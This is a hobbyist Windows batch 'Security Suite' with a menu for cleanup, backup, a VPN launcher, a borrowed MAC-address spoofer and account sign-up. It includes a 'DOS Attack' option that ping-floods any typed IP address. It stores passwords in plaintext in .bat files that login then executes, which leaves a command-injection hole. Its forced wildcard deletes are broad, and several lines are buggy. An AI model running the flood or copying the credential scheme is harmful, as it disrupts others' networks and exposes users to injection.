@echo off
title Security Suite
mode 1000

:forceadmin

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
REM Put "Exit /b" here to open new window (Buggy)
    
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
goto splash

:splash
cls
echo.
echo ***********************************************************************************************************************************************************************                                                                                
echo.                                                                                                                                                                                    
echo.                                                                                    
echo                                                              NMMm
echo            /shhhhyo+       ```      +oyhhhs-                .NMMd
echo              dMMM/        /MMh        :MMo                  `NMMh
echo              sMMMo        dMMN.       +MN-                  `mMMs
echo              :MMMh       -MMMM+       yMh                   `mMMs
echo              .mMMm`      yMNMMh      `mM/       :oooho-     `mMMo         `:oo+yho       -+o+oys/`    -:+oyh`   .ohds.     `+ydy/         `/s+sy+.
echo               hMMN.     .Nh+MMM.     -MN`     :dN-  -NMs    `mMMo       `sNd.  `mm`    -dN+   .dMm/   ..dMMN` `smhNMMN-   +mhdMMMs       +Nd`  +MN/
echo               +MMM:     oM/`NMMo     +Ms     /MM/    sMMs   `dMM+      -NMd`    .m.   /NMo     .MMM/    yMMN `y+  .mMMy  os`  sMMN-     yMN.    mMM:
echo               -MMM+     Nd` yMMm     yM-    -MMm     :MMN.  `dMM+     -NMN-      `   -NMN.      hMMN    sMMd o/    +MMm`/s    `NMM+    oMMs     sMMd
echo               `mMMy    /M:  :MMM-   `md`    dMMs     -MMMo  `dMM/    `mMMh           hMMd       sMMM:   sMMh:o     `MMN-h`     hMMs   .NMM:     oMMM-
echo                yMMd`   dd   `dMMo   -M+    .MMMy---:/yMMMo  `dMM/    /MMM+          .NMMs       oMMM/   sMMsy`      MMNh:      sMMs   +MMM/---:/mMMN-
echo                /MMN.  :M:    +MMm   oN.    /MMMs------..`    dMM:    yMMM:          -MMMo       oMMM:   sMMm+       MMMd       oMMs   yMMM/------..
echo                `MMM:  hh     .mMM:  dy     +MMMo             dMM-    yMMM:          -MMMs       sMMN    sMMN`       MMM+       oMMs   hMMM-
echo                 dMMo -N-      sMMy `M:     -MMMy             hMM-    oMMMo          .NMMd       hMMo    sMMh        MMM-       oMM+   oMMM/
echo                 +MMh hy       .NMN.+m       dMMM.            hMM.    .NMMm`          sMMN.     `MMh`    oMMo        MMN`       oMM:   .NMMd`
echo                 .MMM-m.        yMM/h+       .mMMm-     `/-   hMM.     :NMMh.     `.  `hMMh`    yMy`     oMM+        MMm`       sMM-    /MMMh`     ./`
echo                  hNNd/         -NNmd`        `omMMdysso+.  -/dNNo:`    `omNNhsooo+.    /dNd+:/yy-     ./hNNy/.    :+NNm+:    ./mNNs:`   -ymMNhssso/`
echo                   ``            ```             `.-.`      ``    `        `...`          `.-.`         `    `     ``   ``    ``    `       `.-.`                                                                                                                                                                                                      
echo.
echo.
echo ************************************************************************************************************************************************************************
pause
goto vaultlogin

:vaultlogin
cls
echo.
echo **********************************************************************
echo.
echo Please sign up, or log in, to access the security suite.
echo.
echo 1 - Log In
echo 2 - Sign Up
echo 3 - Cancel
echo.
echo **********************************************************************
SET /P M=Type 1, 2, or 3 then press ENTER:
if %M%==1 goto 1
if %M%==2 goto 2
if %M%==3 goto menu
goto vaultlogin

:2
cls
echo Sign Up
echo ******************************************
echo.
set /p newname="Enter new username:"
if "%newname%"=="%newname%" goto inputname

:inputname
cd "%userprofile%\documents"
if exist "cmdacoBin" goto skip
if not exist "cmdacoBin" goto noskip

:noskip
md "cmdacoBin"
goto skip

:skip
cd "%userprofile%\documents\cmdacoBin"
if exist "%newname%.bat" goto namexist
if not exist "%newname%.bat" goto skip2

:skip2
echo set realusername=%newname%> "%newname%.bat"
goto next

:next
echo.
set /p pswd=Enter new Password:
if "%pswd%"=="%pswd%" goto inputpass

:inputpass
cd "%userprofile%\documents\cmdacoBin"
echo set password=%pswd%>> "%newname%.bat"
goto next1

:namexist
echo.
echo The entered username already exists.
echo Press any key to return. . .
pause >nul
goto 2

:next1
cls
echo Cmd Accounts
echo ************************************
echo.
echo Your account has been successfully created!
echo.
pause
goto vaultlogin

:1
color 07
cls
echo Cmd Accounts Log In
echo ***********************************************
echo.
Set /p logname=Username:
if "%logname%"=="%logname%" goto 2.1

:2.1
echo.
set /p logpass="Password:"
if "%logpass%"=="%logpass%" goto login

:login
cd "%userprofile%\documents\cmdacoBin"
if exist "%logname%.bat" goto call
if not exist "%logname%.bat" goto errorlog

:call
call "%logname%.bat"
if "%password%"=="%logpass%" goto logdone
goto errorlog

:errorlog
color 0c
echo.
echo Username or Password incorrect.
echo Access denied.
pause >nul
goto home

:logdone
cls
echo Password Vault
echo *****************************************************
echo.
echo Successfully logged in!
echo.
echo *****************************************************
pause
goto account

:account
cls
cd "%userprofile%\documents\cmdacoBin"
call "%realusername%color.bat"
call "%realusername%.bat"
color %colorcode%
cls
echo.
echo *******************************************************************************
echo %realusername%
echo *******************************************************************************
@echo off
break off
Title Command Prompt
goto menu

:menu
cls
echo.
echo *********************************************************************
echo.
echo 1 - Remove Cache and Saved Passwords
echo 2 - Start Virtual Private Network
echo 3 - Backup Storage
echo 4 - Password Manager
echo 5 - Advanced
echo 6 - Shutdown
echo.
echo *********************************************************************
SET /P M=Type 1, 2, 3, 4, 5, or 6 then press ENTER:
if %M%==1 goto cache
if %M%==2 goto windscribe
if %M%==3 goto backup
if %M%==4 start C:\Users\JacobsT20446\AppData\Local\keeperpasswordmanager\keeperpasswordmanager.exe
if %M%==5 goto advanced
if %M%==6 goto shutdownoptions
cls
goto menu

:advanced
cls
echo.
echo ********************************************************************
echo.
echo 1 - Password Generator
echo 2 - MAC Address Spoofer
echo 3 - DOS Attack
echo 4 - Cancel
echo.
echo ********************************************************************
SET /P M=Type 1, 2, or 3 then press ENTER:
if %M%==1 goto generator
if %M%==2 goto spoof
if %M%==3 goto DOS
if %M%==4 goto Menu
cls
goto advanced

:generator
cls
echo.
echo Your random password is:
echo.
echo %random%
echo.
pause
goto advanced

:DOS
cd \ 
echo.
echo ************************************************************************************************
echo.
echo Please enter the IP you would like to target. The more devices attacking, the better.
echo.
echo TYPE CTRL+C TO STOP ATTACK
echo.
echo ************************************************************************************************
SET /P target=Enter the target ip then press ENTER:
ping -n 3 localhost >null 
echo Attacking %target%... 
ping -n 3 localhost >null 
:ping 
Ping -t -l 65500 %Target%
goto ping 

:shutdownoptions
cls
echo.
echo ********************************************************************
echo.
echo 1 - Log Off
echo 2 - Shutdown
echo 3 - Reboot
echo 4 - Force Shutdown
echo 5 - Power Off
echo 6 - Cancel
echo.
echo ********************************************************************
SET /P M=Type 1, 2, 3, or 4 then press ENTER:
if %M%==1 goto logoff
if %M%==2 goto shutdown
if %M%==3 goto reboot
if %M%==4 goto force
if %M%==5 goto poweroff
if %M%==6 goto menu
goto shutdownoptions

:poweroff
pushd %~dp0
start /wait "" cmd /c cscript p.vbs
goto menu

:force
pushd %~dp0
start /wait "" cmd /c cscript f.vbs
goto menu

:reboot
pushd %~dp0
start /wait "" cmd /c cscript r.vbs
goto menu

:shutdown
pushd %~dp0
start /wait "" cmd /c cscript s.vbs
goto menu

:logoff
pushd %~dp0
start /wait "" cmd /c cscript l.vbs
goto menu

:backup
cls
echo.
echo *****************************************************************************************
echo.
echo Please verify that removable drive to store the backup is drive letter "D"
echo If it is not, do not run the program.
echo.
echo 1 - Run Backup
echo 2 - Cancel
echo.
echo *****************************************************************************************
SET /P M=Type 1, 2, 3, or 4 then press ENTER:
if %M%==1 goto backupdrive
if %M%==2 goto menu
goto backup

:backupdrive
cls
set drive=D:\Backup
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo.
echo ****************************************************************
echo.
echo Backing up My Documents...
%backupcmd% "%USERPROFILE%\My Documents" "%drive%\My Documents"
echo.
echo ****************************************************************
cls
echo ****************************************************************
echo.
echo Backing up Favorites...
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\Favorites"
echo.
echo ****************************************************************
cls
echo ****************************************************************
echo.
echo Backing up email and address book (Outlook Express)...
%backupcmd% "%USERPROFILE%\Application Data\Microsoft\Address Book" "%drive%\Address Book"
%backupcmd% "%USERPROFILE%\Local Settings\Application Data\Identities" "%drive%\Outlook Express"
echo.
echo ****************************************************************
echo Backing up email and contacts (MS Outlook)...
%backupcmd% "%USERPROFILE%\Local Settings\Application Data\Microsoft\Outlook" "%drive%\Outlook"
echo.
echo ****************************************************************
echo Backing up the Registry...
if not exist "%drive%\Registry" mkdir "%drive%\Registry"
if exist "%drive%\Registry\regbackup.reg" del "%drive%\Registry\regbackup.reg"
regedit /e "%drive%\Registry\regbackup.reg"
echo.
echo *****************************************************************
pause

cls
echo.
echo **************************************************************
echo.
echo Backup Complete!
echo.
echo **************************************************************
pause
goto

:windscribe
cls
start C:\"Program Files (x86)"\Windscribe\windscribelauncher.exe
echo.
echo *******************************************************************************
echo.
echo Click the button to activate
echo.
echo *******************************************************************************
pause
goto menu

:cache
cls
echo.
echo *****************************************************************************************
echo.
echo **WARNING**
echo.
echo You are about to remove your cache, cookies, and all saved passwords on the internet!!!
echo.
echo 1 - Begin
echo 2 - Cancel
echo.
echo *********************************************************************
SET /P M=Type 1 or 2 then press ENTER:
if %M%==1 goto clean
if %M%==2 goto menu
goto cache

:clean
cls
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 32
del /f /q "%userprofile%\Cookies\*.*"
ping localhost -n 3 >nul
del /f /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
goto tempfiles

:tempfiles
ping localhost -n 3 >nul
if exist "C:\WINDOWS\temp"del /f /q "C:WINDOWS\temp\*.*"
if exist "C:\WINDOWS\tmp" del /f /q "C:\WINDOWS\tmp\*.*"
if exist "C:\tmp" del /f /q "C:\tmp\*.*"
if exist "C:\temp" del /f /q "C:\temp\*.*"
if exist "%temp%" del /f /q "%temp%\*.*"
if exist "%tmp%" del /f /q "%tmp%\*.*"
if not exist "C:\WINDOWS\Users\*.*" goto skip
if exist "C:\WINDOWS\Users\*.zip" del "C:\WINDOWS\Users\*.zip" /f /q
if exist "C:\WINDOWS\Users\*.exe" del "C:\WINDOWS\Users\*.exe" /f /q
if exist "C:\WINDOWS\Users\*.gif" del "C:\WINDOWS\Users\*.gif" /f /q
if exist "C:\WINDOWS\Users\*.jpg" del "C:\WINDOWS\Users\*.jpg" /f /q
if exist "C:\WINDOWS\Users\*.png" del "C:\WINDOWS\Users\*.png" /f /q
if exist "C:\WINDOWS\Users\*.bmp" del "C:\WINDOWS\Users\*.bmp" /f /q
if exist "C:\WINDOWS\Users\*.avi" del "C:\WINDOWS\Users\*.avi" /f /q
if exist "C:\WINDOWS\Users\*.mpg" del "C:\WINDOWS\Users\*.mpg" /f /q
if exist "C:\WINDOWS\Users\*.mpeg" del "C:\WINDOWS\Users\*.mpeg" /f /q
if exist "C:\WINDOWS\Users\*.ra" del "C:\WINDOWS\Users\*.ra" /f /q
if exist "C:\WINDOWS\Users\*.ram" del "C:\WINDOWS\Users\*.ram"/f /q
if exist "C:\WINDOWS\Users\*.mp3" del "C:\WINDOWS\Users\*.mp3" /f /q
if exist "C:\WINDOWS\Users\*.mov" del "C:\WINDOWS\Users\*.mov" /f /q
if exist "C:\WINDOWS\Users\*.qt" del "C:\WINDOWS\Users\*.qt" /f /q
if exist "C:\WINDOWS\Users\*.asf" del "C:\WINDOWS\Users\*.asf" /f /q
:skip
if not exist C:\WINDOWS\Users\Users\*.* goto skippy /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.zip del C:\WINDOWS\Users\Users\*.zip /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.exe del C:\WINDOWS\Users\Users\*.exe /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.gif del C:\WINDOWS\Users\Users\*.gif /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.jpg del C:\WINDOWS\Users\Users\*.jpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.png del C:\WINDOWS\Users\Users\*.png /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.bmp del C:\WINDOWS\Users\Users\*.bmp /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.avi del C:\WINDOWS\Users\Users\*.avi /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpg del C:\WINDOWS\Users\Users\*.mpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpeg del C:\WINDOWS\Users\Users\*.mpeg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ra del C:\WINDOWS\Users\Users\*.ra /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ram del C:\WINDOWS\Users\Users\*.ram /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mp3 del C:\WINDOWS\Users\Users\*.mp3 /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.asf del C:\WINDOWS\Users\Users\*.asf /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.qt del C:\WINDOWS\Users\Users\*.qt /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mov del C:\WINDOWS\Users\Users\*.mov /f /q
:skippy
if exist "C:\WINDOWS\ff*.tmp" del C:\WINDOWS\ff*.tmp /f /q
if exist C:\WINDOWS\ShellIconCache del /f /q "C:\WINDOWS\ShellI~1\*.*"
goto defrag

:defrag
ping localhost -n 3 >nul
defrag -c -v
goto endclean

:endclean
cls
echo.
echo *************************************************************************
echo.
echo Process has been completed succesfully
echo.
echo *************************************************************************
pause
goto menu

:spoof
cls
:: --------------------------------------------------------------------------
::
:: Change MAC Address using Batch Files
::
:: (c) Elias Bachaalany <lallousz-x86@yahoo.com>
:: Authored with the help of the following book:
::       Batchography: The Art of Batch Files Programming
::
:main
    setlocal enabledelayedexpansion

    title ChangeMACAddressBatch v1.0 (c) lallouslab.net - The Batchography book

   	:: Show help screen
	if "%1"=="help" (
		goto show-help
	)

	:: Get all relevant information
	call :get-interfaces-info iset iinfo ireg

	:: List adapters
	if "%1"=="list" (
		call :cmdline-list-adapters iset iinfo
		goto :eof
	)

	:: From here and on, operations require administrative privileges
	call :check-privilege-and-instruct
	if %errorlevel%==0 (
		pause
		goto :eof
	)

	:: If no arguments are passed, then start the interactive menu
	if "%1"=="" (
		call :check-privilege-and-abort
		call :main-menu iset iinfo
		pause
		goto :eof
	)

	:: Change adapter MAC address
	if "%1"=="change" (
		call :cmdline-change-mac-address iinfo "%~2"  "%~3"
		goto :eof
	)

	if "%1"=="reset" (
		call :cmdline-reset-mac-address iinfo "%~2"
		goto :eof
	)

	:: Internal invocation (deep and private function testing)
	if "%1"=="__internal" (
		goto internal-dispatch
	)
	goto :eof


:: --------------------------------------------------------------------------
::
:: Command line handler to reset an adapter's MAC address
::
:cmdline-reset-mac-address <1=iinfo> <2=adapater> <3=new mac>
	echo Resetting "%~2"'s MAC address to factory settings
	call :reset-mac-address "%~1" "%~2"

	goto :eof


:: --------------------------------------------------------------------------
::
:: Command line handler to change an adapter's MAC address
::
:cmdline-change-mac-address <1=iinfo> <2=adapater> <3=new mac>
	set __t=%~3
	set __t=%__t:-=%
	echo Changing "%~2"'s MAC address to "%~3"
	call :change-mac-address "%~1" "%~2" "%__t%"

	goto :eof


:: --------------------------------------------------------------------------
::
:: Command line handler to list all detected adapters
::
:cmdline-list-adapters <1=iset> <2=iinfo>
	echo.
	echo Adapters friendly names list:
	echo -------------------------------

	:: For each interface, return the physical address and the adapter name
	for /f "tokens=2 delims=.=" %%a in ('set %~1.') do (
		set __t=!%~2[%%a].mac!
		echo MAC Address: [!__t!] ^| Adapter name: %%a
	)

	goto :eof

:: --------------------------------------------------------------------------
::
:: Check for admin privilege then display instructions if needed
::
:check-privilege-and-instruct
	net session >nul 2>&1
	if %errorlevel% equ 0 exit /b 1

	call :show-banner
	echo.
	echo The %~nx0 script requires administrative privileges to run:
	echo.
	echo 1. If you are starting it from the Windows Explorer, then Right-click
	echo    on the %~nx0 script and choose "Run as administrator"
	echo.
	echo 2. If you are running it from the command prompt, then make sure you
	echo    start a new elevated command prompt and try again.
	echo.
	pause
	goto advanced

:: --------------------------------------------------------------------------
::
:: Show banner
::
:show-banner
	echo   -----================================================================================------
    echo.
    echo      Change the MAC address of network adapters - Batch file script v1.0
    echo.                     Copyright (c) by Elias Bachaalany - lallouslab.net
    echo.
    echo           Inspired by the book "Batchography: The Art of Batch Files Programming"
    echo.
	echo   -----================================================================================------
	echo.
    exit /b


:: --------------------------------------------------------------------------
::
:: Help
::
:show-help
	call :show-banner
	echo Usage:
	echo ---------
	echo.
	echo %~n0 list 
	echo  -- Lists all adapters
	echo.
	echo %~n0 change "Adapter Name" "New MacAddress"
	echo  -- Changes an adapter's MAC address
	echo.
	echo %~n0 reset "Adapter Name" 
	echo  -- Resets an adapater's MAC address
	echo.
	echo.
	exit /b


:: --------------------------------------------------------------------------
::
:: Main interactive menu
::
:main-menu <1=iset> <2=iinfo>
	:main-menu-repeat
	cls
	call :show-banner
	echo.
	echo Please choose adapter:
	echo ------------------------

	set __choices=Q
	for /f "tokens=2 delims=.=" %%a in ('set %~1.') do (
		call set __num=%%%~2[%%a].index%%
		set __choices=!__choices!!__num!
		set __c2i[!__num!]=%%a
		echo !__num!^) %%a
	)
	echo.
	echo Q^) Quit
	
	set /p=">" <nul
	choice /C:%__choices% >nul
	set /a __num=%errorlevel%-1
	if %__num%==0 (
		exit /b 0
	)

	set adapter=!__c2i[%__num%]!
	call :adapter-menu "%~2" "%adapter%"

	goto main-menu-repeat


:: --------------------------------------------------------------------------
::
:: Adapter menu
::
:adapter-menu <1=iinfo> <2=adapter>
	cls

	call set __CurMac=%%%~1[%~2].mac%%
	call :show-banner
	echo Adapter information:
	echo ---------------------
	     echo Friendly Name     :  %~2
	call echo Adapter Name      :  %%%~1[%~2].adapter%%
	     echo MAC Address       :  %__CurMac%
	call echo Connection status :  %%%~1[%~2].state%%
	echo.
	echo Please choose action:
	echo   ^(C^) Change MAC Address
	echo   ^(R^) Reset MAC address
	echo   ^(B^) Back to main menu

	set /p=">" <nul
	choice /C:"BCR" >nul
	set __option=%errorlevel%

	:: Go back to main menu
	if %__option%==1 (
		goto menu
	)

	:: Change MAC address
	if %__option%==2 (
		:: Prompt and validate a new MAC address
		call :prompt-new-mac-address !__CurMac! __NewMac

		:: User cancelled?
		if !errorlevel!==0 (
			goto :eof
		)
		:: Now change the MAC address
		echo Changing MAC address to !__NewMac!
		call :change-mac-address iinfo "%~2" !__NewMac!

		set /p="Adapater MAC address changed. Press any key to go back to the main menu..."<nul
		pause >nul
	)

	:: Reset MAC address
	if %__option%==3 (
		echo.
		choice /C:YN /M "Are you sure you want to reset the MAC address to its default/original value"
		:: User canceled
		if !errorlevel!==2 (
			goto :eof
		)
		:: Reset the MAC address
		echo Resetting MAC address...
		call :reset-mac-address iinfo "%~2"
		pause
	)
	goto :eof


:: --------------------------------------------------------------------------
::
:: Prompt and validate for a new MAC address
::
:prompt-new-mac-address <1=curmac> <2=newmac> => errorlevel(0=cancel, 1=ok)
	echo.
	echo.
	echo The standard (IEEE 802) format for printing MAC-48 addresses in human-friendly form is six groups of 
	echo two hexadecimal digits, separated by hyphens (-).
	echo.
	echo Very Important
	echo ---------------
	echo Note: If you are changing the MAC address of a Wireless adapater then make sure the first two hexadecimal
	echo       digits are "02" or "06", otherwise the adapter MAC address changes won't take effect.
	echo.
	echo Example MAC addresses formats include:
	echo     02-1A-11-2C-24-9D ^<-- Starts with "02" for a Wireless adapater
	echo     50-8A-CB-86-CA-AA
	echo     06-24-65-1D-C3-A2 ^<-- Starts with "06" for a Wireless adapater
	echo     00-0C-07-FC-94-08
	echo     1C-FC-BB-DB-6C-67
	echo.
	echo.	
	:prompt-new-mac-address-repeat
		echo Old MAC address: %~1
		set /p __NewMAC="New MAC address: "

		echo.
		choice /C:YN /M "Are you sure you want to change the MAC address "
		if %errorlevel%==2 (
			exit /b 0
		)
		:: Replace hyphenes
		set __NewMAC=%__NewMAC:-=%

		:: Check the proper length (too short)
		if ".%__NewMAC:~11,1%" EQU "." (
			echo.
			echo *** MAC address value too short ***
			echo.
			:: Repeat the prompt
			goto prompt-new-mac-address-repeat
		)
		:: Too long
		if ".%__NewMAC:~12,1%" NEQ "." (
			echo.
			echo *** MAC address value too long ***
			echo.
			goto prompt-new-mac-address-repeat
		)

	:: Update caller's value
	set %~2=%__NewMAC%

	:: Check if the value has changed or not
	set __t=%~1
	set __t=%__t:-=%
	if "%__NewMAC%"=="%__t%" (
		exit /b 0
	)

	:: Return success
	exit /b 1


:: --------------------------------------------------------------------------
::
::Reset MAC address for a given adapter
:: 
:reset-mac-address <1=iinfo> <2=adapter>
	set __t=!%~1[%~2].reg!
	reg delete "%__t%" /F /V NetworkAddress >nul 2>&1

	:: Refresh the interface
	call :refresh-interface "%~1" "%~2"
	goto :eof


:: --------------------------------------------------------------------------
::
:: Change MAC address
::
:change-mac-address <1=iinfo> <2=adapter> <3=NewMac>
	set __t=!%~1[%~2].reg!
	reg add "%__t%" /F /V NetworkAddress /T REG_SZ /D %~3 >nul 2>&1

	:: Refresh the interface
	call :refresh-interface "%~1" "%~2"
	goto :eof


:: --------------------------------------------------------------------------
::
:: Re=enables interface by bringing it down then up again
::
:refresh-interface <1=iinfo> <2=adapter>
	:: Bring the interface down
	netsh interface set interface "%~2" disable
	:: Bring it up again
	netsh interface set interface "%~2" enable

	:: Refresh the internal information
	call set __t=%%%~1.name%%
	call :get-interfaces-info "%__t%" "%~1" ireg

	goto :eof


:: --------------------------------------------------------------------------
::
:: Get all relevant (combined) interfaces information
::
:get-interfaces-info <1=set-name> <2=iinfo> <3=ireg>
	:: Cache the set-name
	set %~2.name=%~1

	:: Get ipconfig information
	call :get-interfaces-ipconfig-info "%~2" "%~1"

	:: Get the interface registry key information
	call :get-interfaces-reg-keys "%~3"

	set /a __num=1
	:: Link the interface registry key information with the interface info
	for /f "tokens=2 delims=.=" %%a in ('set iset.') do (
		:: Get adapter name
		set __t=!iinfo[%%a].adapter!
		:: Get the ireg key name
		set __v=%~3[!__t!]
		:: Get the ireg key value
		call set __t=%%!__v!%%

		:: Patch-in the registry path into the iinfo
		set %~2[%%a].reg=!__t!

		:: Set a one-based index
		set %~2[%%a].index=!__num!
		set /a __num+=1
	)

	goto :eof


:: --------------------------------------------------------------------------
::
:: Get interfaces registry key pathes into an associative array
:: Scan for both "DriverDesc" and "adapterModel" (in the case of WiFi drivers)
::
:get-interfaces-reg-keys <1=arr>
	call :get-interfaces-reg-keys-ex "%~1" "DriverDesc" 6 "Driver"
	call :get-interfaces-reg-keys-ex "%~1" "AdapterModel" 7 "Adapter"
	goto :eof


::
:: Get interfaces registry key pathes into an associative array
:: (the a-array's key is the driver description (aka the adapter name))
::
:get-interfaces-reg-keys-ex <1=arr> <2=KeyName> <3=MatchLen> <4=MatchVal>
	for /f "tokens=*" %%a in (
		'reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}" /v "%~2" /s 2^>nul'
		) do (
		set __t=%%a
		if "!__t:~0,10!"=="HKEY_LOCAL" (
			set __regkey=%%a
		)
		if "!__t:~0,%3!"=="%~4" (
			for /f "tokens=2*" %%b in ("%%a") do (
				set %~1[%%c]=!__regkey!
			)
		)
	)
	set __regkey=
	set __t=

	goto :eof


:: --------------------------------------------------------------------------
::
:: Get interfaces information from the ipconfig output
::
:get-interfaces-ipconfig-info <1=arr> <2=interfaces-set>
	:: Return interface friendly names
	call :get-interfaces-netsh-info %~1

	:: For each interface, return the physical address and the adapter name
	for /f "tokens=1,2 delims=][" %%a in ('set %~1[') do (
		call :get-interface-info %~1 "%%b"
		set %~2.%%b=1
	)

	exit /b 0


:: --------------------------------------------------------------------------
::
:: Get interface information (adapter name and physical address)
::
:get-interface-info <1=arr> <2=name>
	set /a __stage=0
	for /f "tokens=*" %%a in ('ipconfig /all') do (
		set __var=%%a
		if !__stage! equ 0 (
			set __t=!__var:*adapter %~2:=!
			if "!__t!" NEQ "!__var!" (
				set /a __stage=1
			)
		)
		if !__stage! EQU 1 (
			set __t=!__var:Description . . . . . . . . . . . : =!
			if "!__t!" NEQ "!__var!" (
				set %~1[%~2].adapter=!__t!
				set /a __stage+=1
			)
		)
		if !__stage! EQU 2 (
			set __t=!__var:Physical Address. . . . . . . . . : =!
			if "!__t!" NEQ "!__var!" (
				set %~1[%~2].mac=!__t!
				set /a __stage+=1
			)
		)
	)
	:: Clear work variables
	set __stage=
	set __var=
	set __t=

	goto :eof


:: --------------------------------------------------------------------------
::
:: Return the interfaces information from the netsh command
::
:get-interfaces-netsh-info <1=arr>
	FOR /F "tokens=2,3*" %%a in ('netsh interface show interface') do (
		if /i "%%a" neq "State" (
			set %1[%%c].state=%%a
		)
	)
	exit /b 0


:: --------------------------------------------------------------------------
:: Internal dispatching (test) method
:internal-dispatch
	:: Get rid of the internal argument
	shift
	:: Get the target label
	set __t=%1
	:: Go to the first argument
	shift
	goto %__t%

:: --------------------------------------------------------------------------
:tests
	call :test-get-interfaces-ipconfig-info
	call :test-get-interfaces-reg-keys
	call :test-get-interfaces-info

	goto :eof


:: Test the new MAC address prompt
:test-prompt-new-mac-address
	call :prompt-new-mac-address 11-22-33-44-55-66 newmac
	echo Result: %errorlevel% ; newmac = %newmac%
	goto :eof

::
:: Test all interfaces information
::
:test-get-interfaces-info
	call :get-interfaces-info iset iinfo ireg

	echo ----------------------------
	echo All interfactes information:
	echo ----------------------------

	set iinfo[
	goto :eof

:test-get-interfaces-reg-keys

	call :get-interfaces-reg-keys ireg
	echo Interfaces registry keys map:
	echo -----------------------------
	set ireg[
	goto :eof


:test-get-interfaces-ipconfig-info
	call :get-interfaces-ipconfig-info iinfo ifaces
	echo Interfaces information:
	echo -----------------------
	set iinfo[

	echo.
	echo All interfaces:
	echo ---------------
	set ifaces.

	goto :eof